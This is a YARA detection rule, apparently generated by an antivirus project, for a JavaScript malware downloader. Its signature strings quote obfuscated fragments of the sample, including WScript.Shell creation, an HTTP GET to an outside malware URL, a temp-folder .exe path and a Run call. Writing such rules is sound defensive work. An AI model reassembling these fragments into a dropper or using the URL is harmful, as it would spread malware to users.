rule sig_20160401_c9bce9d424d34eb0897aebdf551d42aa {
  meta:
    description = "datamaliciousorder - file 20160401_c9bce9d424d34eb0897aebdf551d42aa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9ed8a54645053ab7558a21cd8074c6a1cea17354dca6a37b8dc5f82dc61bb27a"

  strings:
    $s1  = "function NvmYjp(OuQyr, IrrXzy){SyGw = SyGw * 1; return OuQyr - IrrXzy;};" fullword ascii
    $s2  = "var NdVq = function KcCmu() {return WScript[RgmHwi](\"WScript\"+\".Shell\");}(), KtFt = 11;" fullword ascii
    $s3  = "RrAun[CruIx](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (RrAun[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZlgIjs(){return XdtUg + \"\";};" fullword ascii
    $s6  = "function EqCd() {return NdVq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"TPlymSY7aJVt.ex\" + \"e\";};" fullword ascii
    $s7  = "function IauAam() {return ((YfgLki == true) && (YfgLki == SyrFwd)) ? 1 : SyGw;};" fullword ascii
    $s8  = "function MqIi(){return 23;};" fullword ascii
    $s9  = "}while (KgEg);" fullword ascii
    $s10 = "var TrCfq = new this[\"Date\"]();" fullword ascii
    $s11 = "function AbtYi(DxJi) {var DyjNc = (1, 2, 3, 4, 5, DxJi); return DyjNc;};" fullword ascii
    $s12 = "return NvmYjp(LhjUv, EpkTfi);" fullword ascii
    $s13 = "SyrFwd = true; " fullword ascii
    $s14 = "var VxQd = false;" fullword ascii
    $s15 = "function JaTn(IrBh){NdVq[\"R\"+\"un\"](IrBh, SyGw, SyGw);};" fullword ascii
    $s16 = "function AqElb(){return RgmHwi;};" fullword ascii
    $s17 = "var SyrFwd = false;" fullword ascii
    $s18 = "var YfgLki = false;" fullword ascii
    $s19 = "YfgLki = true; " fullword ascii
    $s20 = "function LbCn()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}